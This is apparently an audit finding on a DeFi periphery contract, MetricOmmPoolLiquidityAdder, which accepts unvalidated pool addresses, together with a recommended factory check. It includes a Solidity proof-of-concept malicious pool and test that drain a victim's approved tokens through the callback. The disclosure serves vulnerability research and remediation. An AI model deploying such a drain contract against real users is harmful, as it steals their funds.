### Title
`MetricOmmPoolLiquidityAdder` Accepts Unvalidated Pool Address, Allowing Malicious Pool to Drain Caller Tokens via Callback — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address in all four public entry points (`addLiquidityExactShares` × 2, `addLiquidityWeighted` × 2) without verifying it against the factory registry. A malicious contract passed as `pool` passes every callback guard and can pull up to `maxAmount0`/`maxAmount1` of any token from the caller's wallet.

### Finding Description

`MetricOmmPoolLiquidityAdder` explicitly documents the gap:

> *"This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [1](#0-0) 

The internal `_addLiquidity` flow is:

1. `_setPayContext(pool, payer, maxAmount0, maxAmount1)` — stores the attacker-supplied `pool` as the **expected** callback caller in transient storage.
2. `IMetricOmmPoolActions(pool).addLiquidity(...)` — calls the malicious contract.
3. The malicious contract immediately calls back `metricOmmModifyLiquidityCallback(amount0Delta, amount1Delta, abi.encode(KIND_PAY))`. [2](#0-1) 

Inside the callback, every guard passes for a malicious pool:

| Check | Result |
|---|---|
| `kind == KIND_PAY` | Attacker encodes `KIND_PAY` |
| `expectedPool != address(0)` | Set to malicious pool |
| `msg.sender == expectedPool` | Malicious pool is the caller |
| `amount0Delta <= max0 && amount1Delta <= max1` | Attacker sets deltas ≤ caps | [3](#0-2) 

After passing all guards, the callback calls `IMetricOmmPool(msg.sender).getImmutables()` — on the **malicious pool** — to obtain `token0`/`token1`, then calls `pay(token0, payer, msg.sender, amount0Delta)`, transferring the victim's tokens to the malicious pool. [4](#0-3) 

This is the direct analog of the Ajna H-11 bug: just as Ajna's `updateBucketExchangeRatesAndClaim` accepted an arbitrary `pool_` whose return values controlled reward payouts, `MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` whose callback controls token pulls from the victim.

**Contrast with `MetricOmmSimpleRouter`**, which validates every pool against the factory in `_setNextCallbackContext` and again in `_requireExpectedCallbackCaller`: [5](#0-4) [6](#0-5) 

`MetricOmmPoolLiquidityAdder` has no factory reference at all.

### Impact Explanation

Any user who has approved `MetricOmmPoolLiquidityAdder` for token spending and is tricked (via a malicious frontend, phishing, or a compromised integration) into calling `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmount0` of token0 and `maxAmount1` of token1. If the user passes `type(uint256).max` for both caps (a common pattern), their entire approved balance is at risk. No protocol funds are at risk — only caller funds.

### Likelihood Explanation

The `MetricOmmSimpleRouter` validates pools; users and integrators familiar with the router's security model will reasonably expect the liquidity adder to do the same. A malicious frontend or a compromised integration layer can silently substitute a legitimate pool address with a malicious one. The `addLiquidityWeighted` path is especially dangerous because the probe phase (which calls the malicious pool before the pay context is set) can return attacker-controlled `need0`/`need1` values to manipulate share scaling, making the attack less obvious. [7](#0-6) 

### Recommendation

Add a factory reference to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and validate the pool before entering `_addLiquidity` and before the probe call in `addLiquidityWeighted`:

```solidity
IMetricOmmPoolFactory internal immutable FACTORY;

constructor(address weth, address factory) PeripheryPayments(weth) {
    FACTORY = IMetricOmmPoolFactory(factory);
}

function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
}
```

Call `_requireFactoryPool(pool)` at the top of every public entry point, before any external call to `pool`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.35;

import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";
import {IMetricOmmModifyLiquidityCallback} from "@metric-core/interfaces/callbacks/IMetricOmmModifyLiquidityCallback.sol";
import {LiquidityDelta, PoolImmutables} from "...";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousPool {
    address public token0;
    address public token1;
    MetricOmmPoolLiquidityAdder adder;
    uint256 stealAmount;

    constructor(address _token0, address _token1, address _adder, uint256 _amount) {
        token0 = _token0; token1 = _token1;
        adder = MetricOmmPoolLiquidityAdder(_adder);
        stealAmount = _amount;
    }

    // Called by adder during _addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Callback with KIND_PAY and max amounts
        adder.metricOmmModifyLiquidityCallback(stealAmount, 0, abi.encode(uint8(1)));
        return (stealAmount, 0);
    }

    // Called by callback to get token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

contract DrainTest {
    function testDrain(address victim, address token0, address token1, address adder) external {
        uint256 victimBalance = IERC20(token0).balanceOf(victim);
        // victim must have approved adder for token0

        MaliciousPool malicious = new MaliciousPool(token0, token1, adder, victimBalance);

        LiquidityDelta memory d;
        d.binIdxs = new int256[](1); d.binIdxs[0] = 0;
        d.shares = new uint256[](1); d.shares[0] = 1;

        // victim calls adder with malicious pool (e.g. via phishing frontend)
        vm.prank(victim);
        MetricOmmPoolLiquidityAdder(adder).addLiquidityExactShares(
            address(malicious), victim, 0, d,
            victimBalance, 0, ""
        );

        // victim's token0 is now in malicious pool
        assert(IERC20(token0).balanceOf(address(malicious)) == victimBalance);
    }
}
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-31)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```
